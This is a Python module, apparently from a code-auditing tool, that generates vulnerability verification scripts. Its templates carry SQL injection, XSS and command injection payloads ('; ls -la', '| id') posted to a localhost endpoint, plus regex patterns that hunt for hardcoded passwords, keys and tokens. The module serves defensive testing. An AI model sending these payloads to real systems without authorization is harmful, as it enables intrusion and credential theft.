"""验证脚本生成模块

用于为识别到的漏洞生成可复现的验证脚本。
"""

import os
from typing import Dict, List, Optional, Any

from src.ai.models import VulnerabilityFinding
from src.utils.logger import get_logger

logger = get_logger(__name__)


class VerificationScriptGenerator:
    """验证脚本生成器"""

    def __init__(self):
        """初始化验证脚本生成器"""
        self._script_templates = {
            "sql_injection": {
                "python": self._get_sql_injection_python_script(),
                "javascript": self._get_sql_injection_javascript_script()
            },
            "xss": {
                "python": self._get_xss_python_script(),
                "javascript": self._get_xss_javascript_script()
            },
            "command_injection": {
                "python": self._get_command_injection_python_script()
            },
            "hardcoded_credentials": {
                "python": self._get_hardcoded_credentials_python_script()
            },
            "default": {
                "python": self._get_default_python_script()
            }
        }

    def _get_sql_injection_python_script(self):
        return '''#!/usr/bin/env python3
"""
SQL注入漏洞验证脚本

目标: 验证 {rule_name} 漏洞
位置: {file_path}:{line}

步骤:
1. 运行此脚本
2. 观察是否能成功执行SQL注入攻击
3. 检查是否返回了敏感信息
"""

import requests
import sys

# 目标URL
TARGET_URL = "{target_url}"

# 测试 payloads
payloads = [
    "' OR 1=1 --",
    "' UNION SELECT username, password FROM users --",
    "' AND (SELECT COUNT(*) FROM users) > 0 --"
]

print(f"测试 SQL 注入漏洞: {TARGET_URL}")
print("=" * 60)

for i, payload in enumerate(payloads):
    print(f"\n测试 Payload {i+1}: {payload}")
    print("-" * 40)
    
    try:
        # 构建请求数据
        data = {{"{parameter}": payload}}
        response = requests.post(TARGET_URL, data=data, timeout=10)
        
        # 检查响应
        if "error" not in response.text.lower() and response.status_code == 200:
            print(f"[+] 可能存在 SQL 注入漏洞!")
            print(f"响应长度: {len(response.text)}")
            print(f"前 500 字符: {response.text[:500]}...")
        else:
            print("[-] 未检测到 SQL 注入漏洞")
            
    except Exception as e:
        print(f"[!] 测试失败: {e}")

print("\n" + "=" * 60)
print("测试完成")
'''

    def _get_sql_injection_javascript_script(self):
        return '''#!/usr/bin/env node
"""
SQL注入漏洞验证脚本

目标: 验证 {rule_name} 漏洞
位置: {file_path}:{line}

步骤:
1. 运行此脚本: node sql_injection_test.js
2. 观察是否能成功执行SQL注入攻击
3. 检查是否返回了敏感信息
"""

const axios = require('axios');

// 目标URL
const TARGET_URL = "{target_url}";

// 测试 payloads
const payloads = [
    "' OR 1=1 --",
    "' UNION SELECT username, password FROM users --",
    "' AND (SELECT COUNT(*) FROM users) > 0 --"
];

console.log(`测试 SQL 注入漏洞: ${TARGET_URL}`);
console.log("=".repeat(60));

async function testSQLInjection() {
    for (let i = 0; i < payloads.length; i++) {
        const payload = payloads[i];
        console.log(`\n测试 Payload ${i+1}: ${payload}`);
        console.log("-".repeat(40));
        
        try {
            // 构建请求数据
            const data = {{ "{parameter}": payload }};
            const response = await axios.post(TARGET_URL, data, {
                timeout: 10000
            });
            
            // 检查响应
            if (!response.data.toLowerCase().includes("error") && response.status === 200) {
                console.log("[+] 可能存在 SQL 注入漏洞!");
                console.log(`响应长度: ${response.data.length}`);
                console.log(`前 500 字符: ${response.data.substring(0, 500)}...`);
            } else {
                console.log("[-] 未检测到 SQL 注入漏洞");
            }
            
        } catch (error) {
            console.log(`[!] 测试失败: ${error.message}`);
        }
    }
}

testSQLInjection()
    .then(() => {
        console.log("\n" + "=".repeat(60));
        console.log("测试完成");
    })
    .catch(console.error);
'''

    def _get_xss_python_script(self):
        return '''#!/usr/bin/env python3
"""
XSS漏洞验证脚本

目标: 验证 {rule_name} 漏洞
位置: {file_path}:{line}

步骤:
1. 运行此脚本
2. 观察是否能成功执行XSS攻击
3. 检查浏览器是否执行了注入的JavaScript代码
"""

import requests
import sys

# 目标URL
TARGET_URL = "{target_url}"

# 测试 payloads
payloads = [
    "<script>alert('XSS')</script>",
    "<img src='x' onerror='alert(\"XSS\")'>",
    "<svg onload='alert(\"XSS\")'>"
]

print(f"测试 XSS 漏洞: {TARGET_URL}")
print("=" * 60)

for i, payload in enumerate(payloads):
    print(f"\n测试 Payload {i+1}: {payload}")
    print("-" * 40)
    
    try:
        # 构建请求数据
        data = {{"{parameter}": payload}}
        response = requests.post(TARGET_URL, data=data, timeout=10)
        
        # 检查响应
        if payload in response.text:
            print(f"[+] 可能存在 XSS 漏洞!")
            print(f"Payload 被原样返回")
        else:
            print("[-] 未检测到 XSS 漏洞")
            
    except Exception as e:
        print(f"[!] 测试失败: {e}")

print("\n" + "=" * 60)
print("测试完成")
'''

    def _get_xss_javascript_script(self):
        return '''#!/usr/bin/env node
"""
XSS漏洞验证脚本

目标: 验证 {rule_name} 漏洞
位置: {file_path}:{line}

步骤:
1. 运行此脚本: node xss_test.js
2. 观察是否能成功执行XSS攻击
3. 检查浏览器是否执行了注入的JavaScript代码
"""

const axios = require('axios');

// 目标URL
const TARGET_URL = "{target_url}";

// 测试 payloads
const payloads = [
    "<script>alert('XSS')</script>",
    "<img src='x' onerror='alert(\"XSS\")'>",
    "<svg onload='alert(\"XSS\")'>"
];

console.log(`测试 XSS 漏洞: ${TARGET_URL}`);
console.log("=".repeat(60));

async function testXSS() {
    for (let i = 0; i < payloads.length; i++) {
        const payload = payloads[i];
        console.log(`\n测试 Payload ${i+1}: ${payload}`);
        console.log("-".repeat(40));
        
        try {
            // 构建请求数据
            const data = {{ "{parameter}": payload }};
            const response = await axios.post(TARGET_URL, data, {
                timeout: 10000
            });
            
            // 检查响应
            if (response.data.includes(payload)) {
                console.log("[+] 可能存在 XSS 漏洞!");
                console.log("Payload 被原样返回");
            } else {
                console.log("[-] 未检测到 XSS 漏洞");
            }
            
        } catch (error) {
            console.log(`[!] 测试失败: ${error.message}`);
        }
    }
}

testXSS()
    .then(() => {
        console.log("\n" + "=".repeat(60));
        console.log("测试完成");
    })
    .catch(console.error);
'''

    def _get_command_injection_python_script(self):
        return '''#!/usr/bin/env python3
"""
命令注入漏洞验证脚本

目标: 验证 {rule_name} 漏洞
位置: {file_path}:{line}

步骤:
1. 运行此脚本
2. 观察是否能成功执行系统命令
3. 检查是否返回了命令执行结果
"""

import requests
import sys

# 目标URL
TARGET_URL = "{target_url}"

# 测试 payloads
payloads = [
    "; ls -la",
    "| id",
    "&& whoami"
]

print(f"测试 命令注入漏洞: {TARGET_URL}")
print("=" * 60)

for i, payload in enumerate(payloads):
    print(f"\n测试 Payload {i+1}: {payload}")
    print("-" * 40)
    
    try:
        # 构建请求数据
        data = {{"{parameter}": payload}}
        response = requests.post(TARGET_URL, data=data, timeout=10)
        
        # 检查响应
        if "root" in response.text or "bin" in response.text or "usr" in response.text:
            print(f"[+] 可能存在 命令注入漏洞!")
            print(f"响应内容: {response.text}")
        else:
            print("[-] 未检测到 命令注入漏洞")
            
    except Exception as e:
        print(f"[!] 测试失败: {e}")

print("\n" + "=" * 60)
print("测试完成")
'''

    def _get_hardcoded_credentials_python_script(self):
        return '''#!/usr/bin/env python3
"""
硬编码凭证漏洞验证脚本

目标: 验证 {rule_name} 漏洞
位置: {file_path}:{line}

步骤:
1. 检查代码中的硬编码凭证
2. 尝试使用这些凭证登录系统
3. 验证凭证是否有效
"""

import re
import os

# 搜索目录
SEARCH_DIR = "{search_dir}"

print(f"搜索硬编码凭证: {SEARCH_DIR}")
print("=" * 60)

# 常见凭证模式
patterns = [
    r'password\s*=\s*["\']([^"\']+)["\']',
    r'api[_-]?key\s*=\s*["\']([^"\']+)["\']',
    r'secret\s*=\s*["\']([^"\']+)["\']',
    r'token\s*=\s*["\']([^"\']+)["\']',
    r'auth[_-]?key\s*=\s*["\']([^"\']+)["\']'
]

def search_in_file(file_path):
    try:
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            content = f.read()
        
        for pattern in patterns:
            matches = re.findall(pattern, content, re.IGNORECASE)
            if matches:
                print(f"\n[+] 在 {file_path} 中发现硬编码凭证:")
                for match in matches:
                    # 隐藏部分凭证
                    hidden = match[:2] + '*' * (len(match) - 4) + match[-2:] if len(match) > 4 else match
                    print(f"  - {hidden}")
    except Exception as e:
        pass

def search_recursive(directory):
    for root, dirs, files in os.walk(directory):
        # 跳过某些目录
        dirs[:] = [d for d in dirs if d not in ['.git', 'node_modules', 'venv', '__pycache__']]
        
        for file in files:
            if file.endswith(('.py', '.js', '.ts', '.html', '.jsx', '.tsx', '.php')):
                file_path = os.path.join(root, file)
                search_in_file(file_path)

search_recursive(SEARCH_DIR)

print("\n" + "=" * 60)
print("搜索完成")
'''

    def _get_default_python_script(self):
        return '''#!/usr/bin/env python3
"""
漏洞验证脚本

目标: 验证 {rule_name} 漏洞
位置: {file_path}:{line}

步骤:
1. 运行此脚本
2. 按照提示进行测试
3. 检查是否能复现漏洞
"""

import sys

print(f"验证 {rule_name} 漏洞")
print(f"位置: {file_path}:{line}")
print("=" * 60)

print("漏洞描述:")
print({description})
print("\n修复建议:")
print({fix_suggestion})
print("\n漏洞利用场景:")
print({exploit_scenario})

print("\n" + "=" * 60)
print("请按照上述信息手动验证漏洞")
print("测试完成")
'''

    def generate_script(self, finding: VulnerabilityFinding, 
                      language: str = "python",
                      output_dir: str = "./verification_scripts") -> str:
        """生成验证脚本

        Args:
            finding: 漏洞发现
            language: 脚本语言
            output_dir: 输出目录

        Returns:
            str: 生成的脚本路径
        """
        try:
            # 创建输出目录
            os.makedirs(output_dir, exist_ok=True)
            
            # 确定漏洞类型
            vulnerability_type = finding.rule_id.lower()
            
            # 获取脚本模板
            template = self._script_templates.get(vulnerability_type, 
                                               self._script_templates["default"]).get(language, 
                                                                                     self._script_templates["default"]["python"])
            
            # 替换模板变量
            script_content = template.format(
                rule_name=finding.rule_name,
                file_path=finding.location.get("file", "unknown"),
                line=finding.location.get("line", "unknown"),
                description=finding.description,
                fix_suggestion=finding.fix_suggestion,
                exploit_scenario=finding.exploit_scenario,
                target_url="http://localhost:8000/vulnerable-endpoint",  # 默认目标URL
                parameter="input",  # 默认参数名
                search_dir="./"  # 默认搜索目录
            )
            
            # 生成文件名
            filename = f"{vulnerability_type}_test.{language}"
            script_path = os.path.join(output_dir, filename)
            
            # 写入文件
            with open(script_path, 'w', encoding='utf-8') as f:
                f.write(script_content)
            
            # 添加执行权限
            os.chmod(script_path, 0o755)
            
            logger.info(f"Generated verification script: {script_path}")
            return script_path
            
        except Exception as e:
            logger.error(f"Failed to generate verification script: {e}")
            return ""

    def generate_scripts_for_findings(self, findings: List[VulnerabilityFinding],
                                    language: str = "python",
                                    output_dir: str = "./verification_scripts") -> List[str]:
        """为多个漏洞发现生成验证脚本

        Args:
            findings: 漏洞发现列表
            language: 脚本语言
            output_dir: 输出目录

        Returns:
            List[str]: 生成的脚本路径列表
        """
        script_paths = []
        
        for finding in findings:
            # 只为高危漏洞生成脚本
            if finding.severity in ["critical", "high"]:
                script_path = self.generate_script(finding, language, output_dir)
                if script_path:
                    script_paths.append(script_path)
        
        return script_paths

    def generate_readme(self, findings: List[VulnerabilityFinding],
                      script_paths: List[str],
                      output_dir: str = "./verification_scripts") -> str:
        """生成README文件

        Args:
            findings: 漏洞发现列表
            script_paths: 脚本路径列表
            output_dir: 输出目录

        Returns:
            str: README文件路径
        """
        try:
            readme_content = f"# 漏洞验证脚本\n\n本目录包含用于验证发现的安全漏洞的脚本。\n\n## 生成信息\n- 生成时间: {self._get_current_time()}\n- 漏洞数量: {len(findings)}\n- 生成的脚本数量: {len(script_paths)}\n\n## 漏洞列表\n"
            
            # 添加漏洞信息
            for i, finding in enumerate(findings):
                if finding.severity in ["critical", "high"]:
                    readme_content += f"\n### {i+1}. {finding.rule_name}\n"
                    readme_content += f"- 严重程度: {finding.severity}\n"
                    readme_content += f"- 位置: {finding.location.get('file', 'unknown')}:{finding.location.get('line', 'unknown')}\n"
                    readme_content += f"- 描述: {finding.description}\n"
                    readme_content += f"- 修复建议: {finding.fix_suggestion}\n"
            
            # 添加脚本说明
            readme_content += f"\n## 验证脚本\n"
            for script_path in script_paths:
                script_name = os.path.basename(script_path)
                readme_content += f"- `{script_name}`: 运行 `{script_name}` 进行验证\n"
            
            # 添加使用说明
            readme_content += f"\n## 使用说明\n"
            readme_content += f"1. 进入脚本目录: `cd {output_dir}`\n"
            readme_content += f"2. 运行相应的验证脚本\n"
            readme_content += f"3. 观察输出结果，判断是否存在漏洞\n"
            readme_content += f"4. 验证完成后，根据修复建议修复漏洞\n"
            
            # 写入README文件
            readme_path = os.path.join(output_dir, "README.md")
            with open(readme_path, 'w', encoding='utf-8') as f:
                f.write(readme_content)
            
            logger.info(f"Generated README: {readme_path}")
            return readme_path
            
        except Exception as e:
            logger.error(f"Failed to generate README: {e}")
            return ""

    def _get_current_time(self) -> str:
        """获取当前时间

        Returns:
            str: 当前时间字符串
        """
        from datetime import datetime
        return datetime.now().strftime("%Y-%m-%d %H:%M:%S")


# 全局验证脚本生成器实例
_verification_generator: Optional[VerificationScriptGenerator] = None


def get_verification_generator() -> VerificationScriptGenerator:
    """获取验证脚本生成器实例

    Returns:
        VerificationScriptGenerator: 验证脚本生成器实例
    """
    global _verification_generator
    if _verification_generator is None:
        _verification_generator = VerificationScriptGenerator()
    return _verification_generator
